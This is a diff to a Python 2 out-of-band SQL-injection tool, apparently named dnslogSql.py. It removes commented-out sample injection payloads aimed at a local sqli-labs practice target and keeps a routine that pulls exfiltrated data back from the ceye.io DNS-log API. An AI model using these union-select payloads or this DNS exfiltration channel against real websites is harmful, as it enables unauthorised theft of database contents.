@@ -214,14 +214,6 @@ class DnsSql(object):
 			return int(data,16)
 
 
-	# def lendecode(self, code):
-	# 	data = code
-	# 	try:
-	# 		return int(data,16)
-	# 	except Exception,e:
-	# 		print e
-	# 		return e
-
 	def getDnsData(self, taskname):
 		try:
 			APIurl = 'http://api.ceye.io/v1/records?token={token}&type={dns}&filter={filter}'.format(token=self.APItoken, dns='dns', filter=taskname)
@@ -249,14 +241,6 @@ def run(options):
 	sql.getData()
 
 
-
-# sql = DnsSql("http://10.211.55.9/sqli-labs/Less-1/?id=' union select ({}),2,3--+",'taskname')
-# sql.getDb()
-# sqlInj("http://10.211.55.9/sqli-labs/Less-1/?id=' union select 1,({}),3--+", 'sqltest')
-
-# python dnslogSql.py -u "http://10.211.55.9/sqli-labs/Less-1/?id=' union select 1,({}),3--+" -i
-
-
 if __name__ == '__main__':
 	start_time = time.strftime("%Y-%m-%d %H:%M:%S")
 	banner()
@@ -282,9 +266,7 @@ if __name__ == '__main__':
 	(options, args) = parser.parse_args()
 
 	try:
-		# if len(sys.argv[1:]) == 0:
-		# 	parser.print_help()
-		# 	sys.exit(0)
+
 		if options.url:
 			run(options=options)
 		else:
@@ -292,7 +274,6 @@ if __name__ == '__main__':
 			sys.exit(0)
 
 	except KeyboardInterrupt:
-		# logging.info("Ctrl C - Stopping Client")
 		print "Ctrl C - Stopping Client"
 		sys.exit(1)
 
